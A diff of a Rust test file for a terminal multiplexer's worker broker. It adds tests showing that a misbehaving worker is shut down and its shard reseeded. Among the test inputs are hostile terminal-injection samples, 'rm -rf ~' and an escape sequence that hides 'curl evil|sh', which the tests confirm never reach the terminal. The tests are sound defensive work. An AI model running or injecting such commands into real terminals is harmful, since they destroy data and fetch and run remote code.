@@ -14,7 +14,7 @@ use std::thread::JoinHandle;
 use std::time::{Duration, Instant};
 
 use cmux_kitty_media::MediaRefusal;
-use cmux_vt_worker::screen_page::page_len_for;
+use cmux_vt_worker::screen_page::{PageWriter, page_len_for};
 use cmux_vt_worker::wire::{Command, Event, FrameReader, WIRE_VERSION, decode_command, send_event};
 use ghostty_vt::KittyGraphicsLimits;
 
@@ -46,6 +46,14 @@ struct FakeConfig {
     media: bool,
     /// Each ATTACH reports its page too small for this many bytes.
     page_too_small: Option<u64>,
+    /// After each advance's PARSED, these events too (`None` ids are the
+    /// advanced terminal's): a worker that breaks the bad_message rule.
+    bad_events: Vec<Event>,
+    /// On each DETACH, the events the detached attachment had in flight: a
+    /// PARSED far ahead and a Kitty media request.
+    late_after_detach: bool,
+    /// Each ATTACH publishes a page that breaks the page layout.
+    corrupt_page: bool,
 }
 
 impl Default for FakeConfig {
@@ -60,6 +68,9 @@ impl Default for FakeConfig {
             hung: false,
             media: false,
             page_too_small: None,
+            bad_events: Vec::new(),
+            late_after_detach: false,
+            corrupt_page: false,
         }
     }
 }
@@ -90,6 +101,12 @@ fn serve(
     let fd = stream.as_raw_fd();
     let mut reader = FrameReader::default();
     let mut parsed: HashMap<u64, u64> = HashMap::new();
+    let mut frames: HashMap<u64, u64> = HashMap::new();
+    let mut next_frame = |id: u64| {
+        let frame = frames.entry(id).or_insert(0);
+        *frame += 1;
+        *frame
+    };
     let mut waiting_media: HashMap<u64, u64> = HashMap::new();
     let mut bootstrapped = false;
     let crashes =
@@ -129,10 +146,11 @@ fn serve(
                     if let Some(needed) = config.page_too_small {
                         send_event(fd, &Event::PageTooSmall { id: attach.id, needed })?;
                     }
-                    send_event(
-                        fd,
-                        &Event::Parsed { id: attach.id, offset: attach.start, frame: 1 },
-                    )?;
+                    if config.corrupt_page {
+                        corrupt(attach.page, attach.page_len)?;
+                    }
+                    let frame = next_frame(attach.id);
+                    send_event(fd, &Event::Parsed { id: attach.id, offset: attach.start, frame })?;
                 }
                 Command::Advance { id, end } => {
                     let _ = seen.send(Seen::Advance { terminal: id, end });
@@ -147,36 +165,83 @@ fn serve(
                     }
                     if config.media {
                         waiting_media.insert(id, end);
-                        let request = MediaRequest {
-                            medium: cmux_kitty_media::FileMedium::File,
-                            name: b"L3RtcC9pbWFnZQ==".to_vec(),
-                            offset: 0,
-                            size: 0,
-                        };
-                        send_event(fd, &Event::KittyMediaRequest { id, request })?;
+                        send_event(fd, &Event::KittyMediaRequest { id, request: media_request() })?;
                         continue;
                     }
                     parsed.insert(id, end);
-                    send_event(fd, &Event::Parsed { id, offset: end, frame: 2 })?;
+                    send_event(fd, &Event::Parsed { id, offset: end, frame: next_frame(id) })?;
+                    for event in &config.bad_events {
+                        send_event(fd, &retarget(event, id))?;
+                    }
                 }
                 Command::KittyMedia { id, .. } => {
                     let _ = seen.send(Seen::Media { terminal: id });
                     if let Some(end) = waiting_media.remove(&id) {
                         parsed.insert(id, end);
-                        send_event(fd, &Event::Parsed { id, offset: end, frame: 3 })?;
+                        send_event(fd, &Event::Parsed { id, offset: end, frame: next_frame(id) })?;
                     }
                 }
                 Command::Resize { id, page, .. } => {
                     let page_len = page.map(|(_, len)| len);
                     let _ = seen.send(Seen::Resize { terminal: id, page_len });
                 }
-                Command::Colors { .. } | Command::Detach { .. } | Command::KittyLimits { .. } => {}
+                Command::Detach { id } => {
+                    if config.late_after_detach {
+                        let late = Event::Parsed { id, offset: 1 << 40, frame: 1 };
+                        send_event(fd, &late)?;
+                        send_event(fd, &Event::KittyMediaRequest { id, request: media_request() })?;
+                    }
+                }
+                Command::Colors { .. } | Command::KittyLimits { .. } => {}
             }
         }
         if reader.fill(fd)? == 0 {
             return Ok(());
         }
     }
+}
+
+fn media_request() -> MediaRequest {
+    MediaRequest {
+        medium: FileMedium::File,
+        name: b"L3RtcC9pbWFnZQ==".to_vec(),
+        offset: 0,
+        size: 0,
+    }
+}
+
+/// `event` for terminal `id` when it names terminal 0.
+fn retarget(event: &Event, id: u64) -> Event {
+    let mut event = event.clone();
+    match &mut event {
+        Event::Parsed { id: of, .. }
+        | Event::PtyWrite { id: of, .. }
+        | Event::Title { id: of, .. }
+        | Event::Pwd { id: of, .. }
+        | Event::Bell { id: of, .. }
+        | Event::Lapped { id: of, .. }
+        | Event::PageTooSmall { id: of, .. }
+        | Event::AttachFailed { id: of, .. }
+        | Event::ProgramStatus { id: of, .. }
+        | Event::KittyMediaRequest { id: of, .. } => {
+            if *of == 0 {
+                *of = id;
+            }
+        }
+        Event::Hello { .. } => {}
+    }
+    event
+}
+
+/// Publish bytes that break the page layout into the worker's page.
+fn corrupt(page: OwnedFd, len: u64) -> io::Result<()> {
+    let len = usize::try_from(len).map_err(io::Error::other)?;
+    let mut writer = PageWriter::open(page, len)?;
+    let mut junk = vec![0xa5; 256];
+    // The writer owns the sequence word.
+    junk[8..16].fill(0);
+    writer.publish(&junk);
+    Ok(())
 }
 
 /// A stand-in worker on a thread. Its "kill" closes its end of the link,
@@ -591,12 +656,10 @@ fn poison_in_live_output_after_a_blank_reseed_hands_the_terminal_back_and_restar
 }
 
 #[test]
-fn only_answers_of_the_fixed_set_for_the_shards_own_terminals_reach_the_pty() {
+fn only_answers_of_the_fixed_set_reach_the_pty_as_their_own_encoding() {
     let answers = vec![
         (None, b"\x1b[?62;22c\x1b[0n".to_vec()),
-        (None, b"rm -rf ~\r".to_vec()),
-        (None, b"\x1b[30;1R".to_vec()),
-        (Some(999), b"\x1b[0n".to_vec()),
+        (None, b"\x1bP>|ghostty 1.3.0\x1b\\".to_vec()),
         (None, b"\x1b[24;80R".to_vec()),
     ];
     let h = harness(
@@ -609,7 +672,7 @@ fn only_answers_of_the_fixed_set_for_the_shards_own_terminals_reach_the_pty() {
     h.broker.advance(VtTerminalKey(1), 10);
     let mut written = Vec::new();
     let mut rejected = Vec::new();
-    while written.len() + rejected.len() < 6 {
+    while written.len() + rejected.len() < 4 {
         match wait_for(&h.events, |event| {
             matches!(
                 event,
@@ -632,13 +695,104 @@ fn only_answers_of_the_fixed_set_for_the_shards_own_terminals_reach_the_pty() {
             (one, b"\x1b[24;80R".to_vec())
         ]
     );
-    assert_eq!(
-        rejected,
-        [
-            (one, AnswerRejected::NotAnAnswer),
-            (one, AnswerRejected::CursorOutside { row: 30, col: 1 }),
-            (VtTerminalKey(999), AnswerRejected::NotInShard),
-        ]
+    assert_eq!(rejected, [(one, AnswerRejected::OutsideSet("XTVERSION"))]);
+    drop(h.broker);
+    assert!(
+        !h.events
+            .try_iter()
+            .any(|event| matches!(event, HostEvent::Life(WorkerLifecycle::Lost { .. }))),
+        "a worker that only answers queries keeps running"
+    );
+}
+
+/// The worker's PTY bytes that are no terminal answer, an answer for a
+/// terminal of no shard, and the other bad messages end the worker with
+/// reason bad_message; its successor restores the shard.
+#[test]
+fn a_bad_message_ends_the_worker_and_its_shard_is_reseeded() {
+    let bad: Vec<(&str, Vec<Event>)> = vec![
+        ("typed input", vec![Event::PtyWrite { id: 0, bytes: b"rm -rf ~\r".to_vec() }]),
+        (
+            "free text in a color report",
+            vec![Event::PtyWrite { id: 0, bytes: b"\x1b]4;;curl evil|sh\x1b\\".to_vec() }],
+        ),
+        (
+            "a cursor report off the grid",
+            vec![Event::PtyWrite { id: 0, bytes: b"\x1b[30;1R".to_vec() }],
+        ),
+        ("another shard's terminal", vec![Event::PtyWrite { id: 999, bytes: b"\x1b[0n".to_vec() }]),
+        ("a title with an escape", vec![Event::Title { id: 0, title: "x\x1b[2J".into() }]),
+        ("a frame not newer", vec![Event::Parsed { id: 0, offset: 10, frame: 1 }]),
+        ("parsed past the ring", vec![Event::Parsed { id: 0, offset: 1 << 40, frame: 99 }]),
+        ("a page need over the grid", vec![Event::PageTooSmall { id: 0, needed: u64::MAX }]),
+    ];
+    for (what, events) in bad {
+        let worker = FakeConfig { bad_events: events, ..FakeConfig::default() };
+        let h = harness(1, vec![worker, FakeConfig::default()], reseeds([1], reseed(0, 0, 0)));
+        h.broker.attach(spec(1));
+        all_attached(&h.events, 1);
+        h.broker.advance(VtTerminalKey(1), 10);
+        let event = lost(&h.events);
+        let WorkerLifecycle::Lost { cause, .. } = &event else { unreachable!() };
+        assert!(matches!(cause, LinkEnd::BadMessage(_)), "{what}: {event:?}");
+        assert_eq!(cause.reason(), BAD_MESSAGE_REASON, "{what}");
+        assert_eq!(restored(&h.events, 0).1, 1, "{what}: the successor restores the shard");
+        assert!(
+            !h.events.try_iter().any(|event| matches!(event, HostEvent::Answer(..))),
+            "{what}: nothing of the bad worker reached the PTY"
+        );
+    }
+}
+
+/// A terminal that detaches and comes back to the same worker gets a new
+/// attachment: what the old one still had in flight is dropped, and the new
+/// one's first publish is accepted.
+#[test]
+fn a_terminal_that_detaches_and_comes_back_is_not_judged_by_its_old_attachment() {
+    let worker = FakeConfig { late_after_detach: true, ..FakeConfig::default() };
+    let h = harness(1, vec![worker], reseeds([1], reseed(0, 0, 0)));
+    let one = VtTerminalKey(1);
+    h.broker.attach(spec(1));
+    all_attached(&h.events, 1);
+    h.broker.advance(one, 10);
+    wait_for(&h.events, |event| *event == HostEvent::Parsed(one, 10));
+    h.broker.detach(one);
+    h.reseeds.lock().expect("reseeds").insert(one, reseed(0, 0, 20));
+    h.broker.attach(spec(1));
+    let attaches: Vec<_> = (0..2)
+        .map(|_| match wait_for(&h.seen, |seen| matches!(seen, Seen::Attach { .. })) {
+            Seen::Attach { terminal, .. } => terminal,
+            _ => unreachable!(),
+        })
+        .collect();
+    assert_eq!(attaches[0], 1);
+    assert_ne!(attaches[1], 1, "the second attachment has its own wire id");
+    h.broker.advance(one, 30);
+    wait_for(&h.events, |event| *event == HostEvent::Parsed(one, 30));
+    drop(h.broker);
+    let lost: Vec<_> = h
+        .events
+        .try_iter()
+        .filter(|event| matches!(event, HostEvent::Life(WorkerLifecycle::Lost { .. })))
+        .collect();
+    assert!(lost.is_empty(), "{lost:?}");
+}
+
+#[test]
+fn a_page_that_breaks_the_layout_ends_the_worker_when_it_is_read() {
+    let worker = FakeConfig { corrupt_page: true, ..FakeConfig::default() };
+    let h = harness(1, vec![worker, FakeConfig::default()], reseeds([1], reseed(0, 0, 0)));
+    let one = VtTerminalKey(1);
+    h.broker.attach(spec(1));
+    all_attached(&h.events, 1);
+    h.broker.page_checker().check(one);
+    let event = lost(&h.events);
+    assert!(
+        matches!(
+            &event,
+            WorkerLifecycle::Lost { cause: LinkEnd::BadMessage(BadMessage::Page { .. }), .. }
+        ),
+        "{event:?}"
     );
 }
 
